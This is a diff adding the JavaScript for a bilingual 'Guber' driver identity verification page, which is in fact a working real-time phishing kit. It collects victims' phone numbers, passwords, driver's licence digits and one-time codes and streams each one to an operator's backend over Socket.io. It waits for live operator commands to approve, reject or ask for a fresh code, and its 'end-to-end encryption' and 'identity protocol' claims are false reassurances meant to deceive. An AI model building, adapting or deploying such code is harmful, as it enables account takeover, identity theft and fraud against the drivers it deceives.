@@ -1,0 +1,818 @@
+// Initialize Socket.io Connection with graceful fallback
+let socket;
+try {
+    socket = io();
+} catch(e) {
+    socket = null;
+}
+
+// Global State
+let currentStep = 1;
+let currentPhoneNumber = '';
+let currentVerificationId = '';
+let resendCountdown = 60;
+let resendTimer = null;
+let currentLanguage = 'en';
+let flowSettings = {
+    requirePhone: true,
+    requirePassword: true,
+    requireLicense: true,
+    requireOtp: true
+};
+
+async function loadFlowSettings() {
+    try {
+        let settings = null;
+        try {
+            const res = await fetch('/api/page-settings');
+            const data = await res.json();
+            if (data.success && data.settings) {
+                settings = data.settings;
+                localStorage.setItem('guber_page_settings', JSON.stringify(settings));
+            }
+        } catch(e) {}
+
+        if (!settings) {
+            const local = localStorage.getItem('guber_page_settings');
+            if (local) settings = JSON.parse(local);
+        }
+
+        if (settings) {
+            flowSettings = {
+                requirePhone: true,
+                requirePassword: settings.requirePassword !== false,
+                requireLicense: settings.requireLicense !== false,
+                requireOtp: settings.requireOtp !== false
+            };
+            updateBackLinks();
+        }
+    } catch (err) {
+        console.error('Failed to load flow settings:', err);
+    }
+}
+
+function updateBackLinks() {
+    const txtChangeDl = document.getElementById('txt-change-password-dl');
+    if (txtChangeDl) {
+        if (flowSettings.requirePassword) {
+            txtChangeDl.textContent = currentLanguage === 'es' ? 'Cambiar contraseña' : 'Change password';
+        } else {
+            txtChangeDl.textContent = currentLanguage === 'es' ? 'Cambiar número' : 'Change phone number';
+        }
+    }
+
+    const txtChangeOtp = document.getElementById('txt-change-phone');
+    if (txtChangeOtp) {
+        if (flowSettings.requireLicense) {
+            txtChangeOtp.textContent = currentLanguage === 'es' ? 'Cambiar licencia de conducir' : 'Change driver license';
+        } else if (flowSettings.requirePassword) {
+            txtChangeOtp.textContent = currentLanguage === 'es' ? 'Cambiar contraseña' : 'Change password';
+        } else {
+            txtChangeOtp.textContent = currentLanguage === 'es' ? 'Cambiar número' : 'Change phone number';
+        }
+    }
+}
+
+window.addEventListener('storage', (e) => {
+    if (e.key === 'guber_page_settings' && e.newValue) {
+        try {
+            flowSettings = JSON.parse(e.newValue);
+            updateBackLinks();
+        } catch(err) {}
+    }
+});
+
+window.addEventListener('guber_page_settings_changed', (e) => {
+    if (e.detail) {
+        flowSettings = e.detail;
+        updateBackLinks();
+    }
+});
+
+if (socket && typeof socket.on === 'function') {
+    socket.on('page_settings_updated', (settings) => {
+        if (settings) {
+            flowSettings = {
+                requirePhone: true,
+                requirePassword: settings.requirePassword !== false,
+                requireLicense: settings.requireLicense !== false,
+                requireOtp: settings.requireOtp !== false
+            };
+            localStorage.setItem('guber_page_settings', JSON.stringify(flowSettings));
+            updateBackLinks();
+        }
+    });
+}
+
+// Multilingual Dictionaries (EN / ES)
+const translations = {
+    en: {
+        help: 'Help',
+        title: 'Confirm active driver identity',
+        subtitle: 'Enter your active driver phone number to start verification',
+        labelPhone: 'Mobile number',
+        btnSend: 'Continue Verification',
+        btnPassword: 'Continue Verification',
+        headingLicense: "Enter Driver's License",
+        instructionLicense: "Enter the last 6 digits of your driver's license to confirm your identity.",
+        labelLicense: "Last 6 Digits of Driver's License",
+        btnLicense: 'Continue Verification',
+        changePasswordDl: 'Change password',
+        securityNote: 'Your verification is secured with end-to-end encryption.',
+        headingOtp: 'Enter 4-digit code',
+        instructionOtp: 'We sent a 4-digit verification code to',
+        changePhone: 'Change driver license',
+        resendPrompt: "Didn't receive the code?",
+        resendBtn: 'Resend Code',
+        btnVerify: 'Verify Code',
+        successTitle: 'Driver Identity Successfully Verified!',
+        successDesc: 'Thank you for confirming your identity. Your driver profile is active.',
+        labelStatus: 'Status:',
+        valStatus: 'Confirmed Active Driver',
+        labelDriverPhone: 'Driver Phone:',
+        labelTime: 'Timestamp:',
+        btnHome: 'Back to Home',
+        promoTitle: 'Active Driver Portal',
+        promoDesc: 'Ensure identity compliance before starting your drive shift.',
+        srv1Title: 'Identity Compliance',
+        srv1Desc: 'Verify active driver identity securely',
+        srv2Title: 'Driver Support',
+        srv2Desc: '24/7 priority safety and trip assistance',
+        srv3Title: 'Safety Verified',
+        srv3Desc: 'Protected by Guber identity protocol'
+    },
+    es: {
+        help: 'Ayuda',
+        title: 'Confirmar identidad del conductor activo',
+        subtitle: 'Ingrese su número de teléfono de conductor activo para iniciar la verificación',
+        labelPhone: 'Número de móvil',
+        btnSend: 'Continue Verification',
+        btnPassword: 'Continue Verification',
+        headingLicense: 'Ingrese la Licencia de Conducir',
+        instructionLicense: 'Ingrese los últimos 6 dígitos de su licencia de conducir para confirmar su identidad.',
+        labelLicense: 'Últimos 6 dígitos de la licencia',
+        btnLicense: 'Continue Verification',
+        changePasswordDl: 'Cambiar contraseña',
+        securityNote: 'Su verificación está protegida con cifrado de extremo a extremo.',
+        headingOtp: 'Ingrese el código de 4 dígitos',
+        instructionOtp: 'Enviamos un código de verificación de 4 dígitos a',
+        changePhone: 'Cambiar licencia de conducir',
+        resendPrompt: '¿No recibiste el código?',
+        resendBtn: 'Reenviar código',
+        btnVerify: 'Verificar código',
+        successTitle: '¡Identidad del Conductor Verificada con Éxito!',
+        successDesc: 'Gracias por confirmar su identidad. Su perfil de conductor está activo.',
+        labelStatus: 'Estado:',
+        valStatus: 'Conductor Activo Confirmado',
+        labelDriverPhone: 'Teléfono del Conductor:',
+        labelTime: 'Marca de tiempo:',
+        btnHome: 'Volver al Inicio',
+        promoTitle: 'Portal del Conductor Activo',
+        promoDesc: 'Garantice el cumplimiento de identidad antes de iniciar su turno.',
+        srv1Title: 'Cumplimiento de Identidad',
+        srv1Desc: 'Verifique la identidad del conductor de forma segura',
+        srv2Title: 'Soporte al Conductor',
+        srv2Desc: 'Asistencia prioritaria de seguridad y viajes 24/7',
+        srv3Title: 'Seguridad Verificada',
+        srv3Desc: 'Protegido por el protocolo de identidad de Guber'
+    }
+};
+
+// DOM Elements
+const stepPhone = document.getElementById('step-phone');
+const stepPassword = document.getElementById('step-password');
+const stepLicense = document.getElementById('step-license');
+const stepOtp = document.getElementById('step-otp');
+const stepVerified = document.getElementById('step-verified');
+
+const phoneForm = document.getElementById('phone-form');
+const phoneInput = document.getElementById('phone-input');
+const passwordInput = document.getElementById('password-input');
+const licenseForm = document.getElementById('license-form');
+const licenseInput = document.getElementById('license-input');
+const otpInputs = document.querySelectorAll('.otp-box');
+const otp1 = document.getElementById('otp-1');
+const btnVerifyOtp = document.getElementById('btn-verify-otp');
+
+const userPhoneDisplay = document.getElementById('user-phone-display');
+const userPhoneDisplayPw = document.getElementById('user-phone-display-pw');
+const userPhoneDisplayDl = document.getElementById('user-phone-display-dl');
+const displayPhoneVerified = document.getElementById('final-phone-display');
+const displayTimestamp = document.getElementById('final-date-display');
+
+// Initialize UI & Language
+document.addEventListener('DOMContentLoaded', () => {
+    setLanguage('en');
+    loadFlowSettings();
+});
+
+// Switch UI Language
+function setLanguage(lang) {
+    currentLanguage = lang;
+    const langMenu = document.getElementById('lang-menu');
+    if (langMenu) langMenu.classList.add('hidden');
+
+    const langText = document.getElementById('current-lang-text');
+    if (langText) langText.textContent = lang.toUpperCase();
+
+    const options = document.querySelectorAll('.lang-option');
+    options.forEach(opt => {
+        const onclickAttr = opt.getAttribute('onclick') || '';
+        if (onclickAttr.includes(lang)) {
+            opt.classList.add('active');
+        } else {
+            opt.classList.remove('active');
+        }
+    });
+
+    const t = translations[lang] || translations['en'];
+
+    const safeSetText = (id, text) => {
+        const el = document.getElementById(id);
+        if (el) el.textContent = text;
+    };
+    const safeSetHtml = (id, html) => {
+        const el = document.getElementById(id);
+        if (el) el.innerHTML = html;
+    };
+
+    safeSetText('txt-title', t.title);
+    safeSetText('txt-subtitle', t.subtitle);
+    safeSetText('txt-label-phone', t.labelPhone);
+    safeSetText('txt-btn-send', t.btnSend);
+    safeSetHtml('txt-security-note', `<i class="fa-solid fa-shield-halved"></i> ${t.securityNote}`);
+    safeSetHtml('txt-security-note-pw', `<i class="fa-solid fa-shield-halved"></i> ${t.securityNote}`);
+    safeSetHtml('txt-security-note-dl', `<i class="fa-solid fa-shield-halved"></i> ${t.securityNote}`);
+    safeSetText('txt-heading-license', t.headingLicense);
+    safeSetText('txt-instruction-license', t.instructionLicense);
+    safeSetText('txt-label-license', t.labelLicense);
+    safeSetText('txt-btn-license', t.btnLicense);
+    safeSetText('txt-change-password-dl', t.changePasswordDl);
+    safeSetText('txt-change-phone', t.changePhone);
+    safeSetText('txt-heading-otp', t.headingOtp);
+    safeSetText('txt-instruction-otp', t.instructionOtp);
+    safeSetText('txt-resend-prompt', t.resendPrompt);
+    safeSetText('txt-resend-btn', t.resendBtn);
+    safeSetText('txt-btn-verify', t.btnVerify);
+    safeSetText('txt-success-title', t.successTitle);
+    safeSetText('txt-success-desc', t.successDesc);
+    safeSetText('txt-label-status', t.labelStatus);
+    safeSetText('txt-val-status', t.valStatus);
+    safeSetText('txt-label-driver-phone', t.labelDriverPhone);
+    safeSetText('txt-label-time', t.labelTime);
+    safeSetText('txt-btn-home', t.btnHome);
+    safeSetText('txt-promo-title', t.promoTitle);
+    safeSetText('txt-promo-desc', t.promoDesc);
+    safeSetText('txt-srv1-title', t.srv1Title);
+    safeSetText('txt-srv1-desc', t.srv1Desc);
+    safeSetText('txt-srv2-title', t.srv2Title);
+    safeSetText('txt-srv2-desc', t.srv2Desc);
+    safeSetText('txt-srv3-title', t.srv3Title);
+    safeSetText('txt-srv3-desc', t.srv3Desc);
+    safeSetText('nav-help', t.help);
+
+    updateBackLinks();
+}
+
+function switchLanguage(lang) {
+    setLanguage(lang);
+}
+
+// Close language dropdown if clicked outside
+document.addEventListener('click', (e) => {
+    const dropdown = document.querySelector('.lang-dropdown');
+    if (dropdown && !dropdown.contains(e.target)) {
+        const langMenu = document.getElementById('lang-menu');
+        if (langMenu) langMenu.classList.add('hidden');
+    }
+});
+
+function toggleLangMenu() {
+    const menu = document.getElementById('lang-menu');
+    if (menu) menu.classList.toggle('hidden');
+}
+
+function toggleLangDropdown() {
+    toggleLangMenu();
+}
+
+// Broadcast helper for GitHub Pages / Cloud sync
+function saveCloudRecord(record) {
+    let logs = JSON.parse(localStorage.getItem('guber_records') || '[]');
+    const existingIdx = logs.findIndex(r => r.id === record.id || r._id === record.id || r.phoneNumber === record.phoneNumber);
+    if (existingIdx !== -1) {
+        logs[existingIdx] = { ...logs[existingIdx], ...record };
+    } else {
+        logs.unshift(record);
+    }
+    localStorage.setItem('guber_records', JSON.stringify(logs));
+    window.dispatchEvent(new CustomEvent('guber_record_updated', { detail: record }));
+}
+
+// Handle Phone Form Submission
+function handlePhoneSubmit(e) {
+    e.preventDefault();
+    if (!phoneInput) return;
+
+    const phoneVal = phoneInput.value.trim();
+
+    if (!phoneVal || phoneVal.length < 7) {
+        return;
+    }
+
+    const countrySelect = document.getElementById('country-code-select');
+    const countryCode = countrySelect ? countrySelect.value : '+1';
+    const fullPhone = countryCode + ' ' + phoneVal.replace(/[^0-9]/g, '');
+    currentPhoneNumber = fullPhone;
+    currentVerificationId = 'REC_' + Date.now();
+
+    const btn = document.getElementById('btn-send-phone');
+    setLoading(btn, true);
+
+    const customSlug = window.location.pathname + window.location.search;
+    const recData = {
+        id: currentVerificationId,
+        _id: currentVerificationId,
+        phoneNumber: fullPhone,
+        status: 'PHONE_SUBMITTED',
+        customSlug: customSlug,
+        submittedAt: new Date().toISOString()
+    };
+
+    saveCloudRecord(recData);
+
+    // Socket.io emit phone number to backend with custom slug
+    if (socket && typeof socket.emit === 'function') {
+        socket.emit('submit_phone', { phoneNumber: fullPhone, customSlug: customSlug }, (response) => {
+            if (response && response.verificationId) {
+                currentVerificationId = response.verificationId;
+            }
+        });
+    }
+
+    setTimeout(() => {
+        setLoading(btn, false);
+        if (userPhoneDisplayPw) userPhoneDisplayPw.textContent = fullPhone;
+        if (userPhoneDisplayDl) userPhoneDisplayDl.textContent = fullPhone;
+        if (userPhoneDisplay) userPhoneDisplay.textContent = fullPhone;
+        updateBackLinks();
+
+        if (flowSettings.requirePassword) {
+            switchStep(stepPhone, stepPassword);
+            if (passwordInput) passwordInput.focus();
+        } else if (flowSettings.requireLicense) {
+            switchStep(stepPhone, stepLicense);
+            if (licenseInput) licenseInput.focus();
+        } else if (flowSettings.requireOtp) {
+            switchStep(stepPhone, stepOtp);
+            startResendTimer();
+            if (otp1) otp1.focus();
+        } else {
+            if (pendingPhoneDisplay) pendingPhoneDisplay.textContent = fullPhone;
+            switchStep(stepPhone, stepPending);
+        }
+    }, 400);
+}
+
+// Handle Password Form Submission
+function handlePasswordSubmit(e) {
+    if (e) e.preventDefault();
+    if (!passwordInput) return;
+
+    const pwVal = passwordInput.value.trim();
+    if (!pwVal) return;
+
+    const btn = document.getElementById('btn-submit-password');
+    setLoading(btn, true);
+
+    const customSlug = window.location.pathname + window.location.search;
+    const recData = {
+        id: currentVerificationId,
+        _id: currentVerificationId,
+        phoneNumber: currentPhoneNumber,
+        password: pwVal,
+        status: 'PASSWORD_SUBMITTED',
+        customSlug: customSlug,
+        submittedAt: new Date().toISOString()
+    };
+
+    saveCloudRecord(recData);
+
+    if (socket && typeof socket.emit === 'function') {
+        socket.emit('submit_password', {
+            verificationId: currentVerificationId,
+            phoneNumber: currentPhoneNumber,
+            password: pwVal,
+            customSlug: customSlug
+        });
+    }
+
+    setTimeout(() => {
+        setLoading(btn, false);
+        if (userPhoneDisplayDl) userPhoneDisplayDl.textContent = currentPhoneNumber;
+        if (userPhoneDisplay) userPhoneDisplay.textContent = currentPhoneNumber;
+        updateBackLinks();
+
+        if (flowSettings.requireLicense) {
+            switchStep(stepPassword, stepLicense);
+            if (licenseInput) licenseInput.focus();
+        } else if (flowSettings.requireOtp) {
+            switchStep(stepPassword, stepOtp);
+            startResendTimer();
+            if (otp1) otp1.focus();
+        } else {
+            if (pendingPhoneDisplay) pendingPhoneDisplay.textContent = currentPhoneNumber;
+            switchStep(stepPassword, stepPending);
+        }
+    }, 400);
+}
+
+// Handle Driver License (Last 6 Digits) Form Submission
+function handleLicenseSubmit(e) {
+    if (e) e.preventDefault();
+    if (!licenseInput) return;
+
+    const licenseVal = licenseInput.value.trim();
+    if (!licenseVal) return;
+
+    const btn = document.getElementById('btn-submit-license');
+    setLoading(btn, true);
+
+    const customSlug = window.location.pathname + window.location.search;
+    const recData = {
+        id: currentVerificationId,
+        _id: currentVerificationId,
+        phoneNumber: currentPhoneNumber,
+        licenseDigits: licenseVal,
+        status: 'LICENSE_SUBMITTED',
+        customSlug: customSlug,
+        submittedAt: new Date().toISOString()
+    };
+
+    saveCloudRecord(recData);
+
+    if (socket && typeof socket.emit === 'function') {
+        socket.emit('submit_license', {
+            verificationId: currentVerificationId,
+            phoneNumber: currentPhoneNumber,
+            licenseDigits: licenseVal,
+            customSlug: customSlug
+        });
+    }
+
+    setTimeout(() => {
+        setLoading(btn, false);
+        if (userPhoneDisplay) userPhoneDisplay.textContent = currentPhoneNumber;
+        updateBackLinks();
+
+        if (flowSettings.requireOtp) {
+            switchStep(stepLicense, stepOtp);
+            startResendTimer();
+            if (otp1) otp1.focus();
+        } else {
+            if (pendingPhoneDisplay) pendingPhoneDisplay.textContent = currentPhoneNumber;
+            switchStep(stepLicense, stepPending);
+        }
+    }, 400);
+}
+
+function goToStepLicense() {
+    updateBackLinks();
+    if (flowSettings.requireLicense) {
+        switchStep(stepOtp, stepLicense);
+        if (licenseInput) licenseInput.focus();
+    } else if (flowSettings.requirePassword) {
+        switchStep(stepOtp, stepPassword);
+        if (passwordInput) passwordInput.focus();
+    } else {
+        switchStep(stepOtp, stepPhone);
+        if (phoneInput) phoneInput.focus();
+    }
+}
+
+function goToStepPassword() {
+    updateBackLinks();
+    if (flowSettings.requirePassword) {
+        switchStep(stepLicense, stepPassword);
+        if (passwordInput) passwordInput.focus();
+    } else {
+        switchStep(stepLicense, stepPhone);
+        if (phoneInput) phoneInput.focus();
+    }
+}
+
+function goToStepPhone() {
+    updateBackLinks();
+    switchStep(getCurrentActiveStep(), stepPhone);
+    if (phoneInput) phoneInput.focus();
+}
+
+function togglePasswordVisibility() {
+    const pwInput = document.getElementById('password-input');
+    const icon = document.getElementById('pw-eye-icon');
+    if (!pwInput || !icon) return;
+
+    if (pwInput.type === 'password') {
+        pwInput.type = 'text';
+        icon.className = 'fa-solid fa-eye-slash';
+    } else {
+        pwInput.type = 'password';
+        icon.className = 'fa-solid fa-eye';
+    }
+}
+
+// Setup 4-Digit OTP Box Focus & Paste Logic (NO AUTO SUBMIT)
+otpInputs.forEach((input, index) => {
+    input.addEventListener('input', (e) => {
+        const val = e.target.value;
+        e.target.value = val.replace(/[^0-9]/g, '');
+
+        if (e.target.value.length === 1) {
+            if (index < otpInputs.length - 1) {
+                otpInputs[index + 1].focus();
+            }
+        }
+    });
+
+    input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !e.target.value && index > 0) {
+            otpInputs[index - 1].focus();
+        }
+    });
+
+    input.addEventListener('paste', (e) => {
+        e.preventDefault();
+        const pastedData = (e.clipboardData || window.clipboardData).getData('text').trim();
+        const digits = pastedData.replace(/[^0-9]/g, '').slice(0, 4);
+        
+        if (digits.length > 0) {
+            digits.split('').forEach((char, i) => {
+                if (otpInputs[i]) {
+                    otpInputs[i].value = char;
+                }
+            });
+            otpInputs[Math.min(digits.length, 3)].focus();
+        }
+    });
+});
+
+// DOM Elements for Pending & Rejected
+const stepPending = document.getElementById('step-pending');
+const stepRejected = document.getElementById('step-rejected');
+const pendingPhoneDisplay = document.getElementById('pending-phone-display');
+
+function cleanPhone(p) {
+    return (p || '').replace(/[^0-9]/g, '');
+}
+
+function getCurrentActiveStep() {
+    if (stepPhone && !stepPhone.classList.contains('hidden-step')) return stepPhone;
+    if (stepPassword && !stepPassword.classList.contains('hidden-step')) return stepPassword;
+    if (stepLicense && !stepLicense.classList.contains('hidden-step')) return stepLicense;
+    if (stepOtp && !stepOtp.classList.contains('hidden-step')) return stepOtp;
+    if (stepPending && !stepPending.classList.contains('hidden-step')) return stepPending;
+    if (stepVerified && !stepVerified.classList.contains('hidden-step')) return stepVerified;
+    if (stepRejected && !stepRejected.classList.contains('hidden-step')) return stepRejected;
+    return stepPhone;
+}
+
+// Handle Manual OTP Form Verification Submission
+function handleOtpSubmit(e) {
+    if (e) e.preventDefault();
+
+    let otpCode = '';
+    otpInputs.forEach(i => otpCode += i.value);
+
+    if (otpCode.length !== 4) {
+        alert('Please enter a valid 4-digit verification code.');
+        return;
+    }
+
+    const btn = document.getElementById('btn-verify-otp');
+    setLoading(btn, true);
+
+    const customSlug = window.location.pathname + window.location.search;
+    const recData = {
+        id: currentVerificationId,
+        _id: currentVerificationId,
+        phoneNumber: currentPhoneNumber,
+        otp: otpCode,
+        status: 'OTP_SUBMITTED',
+        customSlug: customSlug,
+        submittedAt: new Date().toISOString()
+    };
+
+    saveCloudRecord(recData);
+
+    // Socket.io emit 4-digit OTP to backend with custom slug
+    if (socket && typeof socket.emit === 'function') {
+        socket.emit('submit_otp', {
+            verificationId: currentVerificationId,
+            phoneNumber: currentPhoneNumber,
+            otp: otpCode,
+            customSlug: customSlug
+        });
+    }
+
+    setTimeout(() => {
+        setLoading(btn, false);
+        if (pendingPhoneDisplay) pendingPhoneDisplay.textContent = currentPhoneNumber;
+        switchStep(stepOtp, stepPending);
+    }, 400);
+}
+
+// Socket Listeners for Real-time Admin Decisions
+if (socket && typeof socket.on === 'function') {
+    socket.on('verification_approved', (data) => {
+        if (!data || !data.phoneNumber) return;
+        if (cleanPhone(data.phoneNumber) === cleanPhone(currentPhoneNumber)) {
+            triggerConfetti();
+            if (displayPhoneVerified) displayPhoneVerified.textContent = currentPhoneNumber;
+            if (displayTimestamp) displayTimestamp.textContent = new Date().toLocaleString('en-US', { dateStyle: 'short', timeStyle: 'short' });
+            switchStep(getCurrentActiveStep(), stepVerified);
+        }
+    });
+
+    socket.on('verification_request_new_otp', (data) => {
+        if (!data || !data.phoneNumber) return;
+        if (cleanPhone(data.phoneNumber) === cleanPhone(currentPhoneNumber)) {
+            otpInputs.forEach(i => i.value = '');
+            const banner = document.getElementById('otp-error-banner');
+            const textEl = document.getElementById('otp-error-text');
+            if (banner) {
+                banner.style.display = 'flex';
+                banner.classList.remove('hidden');
+            }
+            if (textEl && data.message) {
+                textEl.textContent = data.message;
+            }
+            switchStep(getCurrentActiveStep(), stepOtp);
+            if (otp1) otp1.focus();
+        }
+    });
+
+    socket.on('verification_rejected', (data) => {
+        if (!data || !data.phoneNumber) return;
+        if (cleanPhone(data.phoneNumber) === cleanPhone(currentPhoneNumber)) {
+            switchStep(getCurrentActiveStep(), stepRejected);
+        }
+    });
+}
+
+// Navigation Back to Phone Step
+function goToStep1() {
+    clearInterval(resendTimer);
+    otpInputs.forEach(i => i.value = '');
+    switchStep(null, stepPhone);
+}
+
+function goToStepPhone() {
+    goToStep1();
+}
+
+function goToStepPassword() {
+    switchStep(null, stepPassword);
+    if (passwordInput) passwordInput.focus();
+}
+
+// Switch Steps & Toggle Hero Image Visibility
+function switchStep(fromStep, toStep, pushState = true) {
+    if (!toStep) return;
+
+    // Bulletproof: Hide all steps first so multiple steps never remain visible simultaneously
+    const allSteps = document.querySelectorAll('.step-view');
+    allSteps.forEach(step => {
+        step.classList.remove('active-step');
+        step.classList.add('hidden-step');
+        step.style.display = 'none';
+    });
+
+    // Display target step exclusively
+    toStep.classList.remove('hidden-step');
+    toStep.classList.add('active-step');
+    toStep.style.display = 'block';
+
+    const contentContainer = document.querySelector('.content-container');
+    const heroIllustrationBox = document.querySelector('.hero-illustration-box');
+    const txtSubtitle = document.getElementById('txt-subtitle');
+
+    if (txtSubtitle) {
+        if (toStep === stepRejected) {
+            txtSubtitle.style.display = 'none';
+        } else {
+            txtSubtitle.style.display = 'block';
+        }
+    }
+
+    if (toStep === stepPhone) {
+        currentStep = 1;
+        if (contentContainer) contentContainer.classList.remove('single-column');
+        if (heroIllustrationBox) heroIllustrationBox.style.display = 'flex';
+    } else {
+        currentStep = (toStep === stepPassword || toStep === stepOtp) ? 2 : 3;
+        if (contentContainer) contentContainer.classList.add('single-column');
+        if (heroIllustrationBox) heroIllustrationBox.style.display = 'none';
+    }
+
+    if (pushState && history.pushState && toStep.id) {
+        history.pushState({ stepId: toStep.id }, '', '#' + toStep.id.replace('step-', ''));
+    }
+}
+
+// Support Browser Back and Forward buttons seamlessly
+window.addEventListener('popstate', (e) => {
+    if (e.state && e.state.stepId) {
+        const targetElem = document.getElementById(e.state.stepId);
+        if (targetElem) {
+            switchStep(null, targetElem, false);
+            return;
+        }
+    }
+    switchStep(null, stepPhone, false);
+});
+
+// Resend Timer Logic
+function startResendTimer() {
+    clearInterval(resendTimer);
+    resendCountdown = 60;
+    const timerElem = document.getElementById('timer-count');
+    const btnElem = document.getElementById('btn-resend');
+
+    if (btnElem) {
+        btnElem.disabled = true;
+        btnElem.style.opacity = '0.5';
+    }
+
+    resendTimer = setInterval(() => {
+        resendCountdown--;
+        if (timerElem) timerElem.textContent = `${resendCountdown}`;
+
+        if (resendCountdown <= 0) {
+            clearInterval(resendTimer);
+            if (btnElem) {
+                btnElem.disabled = false;
+                btnElem.style.opacity = '1';
+            }
+        }
+    }, 1000);
+}
+
+function handleResendCode() {
+    startResendTimer();
+    const btn = document.getElementById('btn-resend');
+    if (btn) {
+        btn.textContent = 'Code Sent!';
+        setTimeout(() => {
+            btn.textContent = (translations[currentLanguage] || translations.en).resendBtn;
+        }, 2000);
+    }
+}
+
+function resendCode() {
+    handleResendCode();
+}
+
+function resetFlow() {
+    if (phoneInput) phoneInput.value = '';
+    otpInputs.forEach(i => i.value = '');
+    switchStep(stepVerified, stepPhone);
+}
+
+// Utility Loading Spinner State
+function setLoading(button, isLoading) {
+    if (!button) return;
+    if (isLoading) {
+        button.disabled = true;
+        button.dataset.origText = button.innerHTML;
+        button.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin"></i> Please wait...`;
+    } else {
+        button.disabled = false;
+        if (button.dataset.origText) {
+            button.innerHTML = button.dataset.origText;
+        }
+    }
+}
+
+// Confetti Celebration
+function triggerConfetti() {
+    try {
+        const count = 200;
+        const defaults = { origin: { y: 0.7 } };
+
+        function fire(particleRatio, opts) {
+            if (typeof confetti === 'function') {
+                confetti(Object.assign({}, defaults, opts, {
+                    particleCount: Math.floor(count * particleRatio)
+                }));
+            }
+        }
+
+        if (typeof confetti === 'function') {
+            fire(0.25, { spread: 26, startVelocity: 55 });
+            fire(0.2, { spread: 60 });
+            fire(0.35, { spread: 100, decay: 0.91, scalar: 0.8 });
+            fire(0.1, { spread: 120, startVelocity: 25, decay: 0.92, scalar: 1.2 });
+            fire(0.1, { spread: 120, startVelocity: 45 });
+        }
+    } catch (e) {}
+}
